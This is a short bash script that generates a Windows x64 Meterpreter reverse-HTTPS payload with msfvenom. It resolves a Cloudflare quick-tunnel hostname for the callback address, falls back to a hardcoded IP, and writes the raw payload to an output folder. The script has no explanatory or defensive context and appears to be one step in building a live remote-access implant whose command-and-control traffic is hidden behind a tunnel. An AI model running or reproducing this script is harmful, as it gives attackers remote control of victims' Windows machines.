#!/bin/bash
TUNNEL="twist-commented-status-terrorists.trycloudflare.com"
PORT="443"
LHOST_IP=$(dig +short $TUNNEL | head -n1)
[ -z "$LHOST_IP" ] && LHOST_IP="104.16.231.132"
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="$LHOST_IP" LPORT="$PORT" -f raw -o ../output/payload.raw
[ -f ../output/payload.raw ] && echo "✓ Done" || exit 1
